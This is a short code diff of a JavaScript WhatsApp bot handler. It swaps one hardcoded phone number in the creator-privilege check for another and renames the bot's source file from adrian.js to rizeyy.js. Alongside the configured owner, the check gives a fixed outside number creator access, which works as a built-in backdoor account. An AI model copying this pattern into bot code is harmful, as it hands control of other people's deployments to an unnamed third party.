@@ -48,7 +48,7 @@ module.exports = conn = async (conn, m, chatUpdate, store) => {
         const full_args = body.replace(command, '').slice(1).trim()
         const pushname = m.pushName || "No Name"
         const botNumber = await conn.decodeJid(conn.user.id)
-        const isCreator = [botNumber, global.owner, '6289513081052'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+        const isCreator = [botNumber, global.owner, '6283135080900'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
         const itsMe = m.sender == botNumber ? true : false
         const text = q = args.join(" ")
         const fatkuns = (m.quoted || m)
@@ -127,10 +127,10 @@ module.exports = conn = async (conn, m, chatUpdate, store) => {
         const more = String.fromCharCode(8206)
         const readmore = more.repeat(4001)
         const getCase = (cases) => {
-            return "case  "+`'${cases}'`+fs.readFileSync("./adrian.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
+            return "case  "+`'${cases}'`+fs.readFileSync("./rizeyy.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
         }
         const totalFitur = () =>{
-            var mytext = fs.readFileSync("./adrian.js").toString()
+            var mytext = fs.readFileSync("./rizeyy.js").toString()
             var numUpper = (mytext.match(/case '/g) || []).length;
             return numUpper
         }
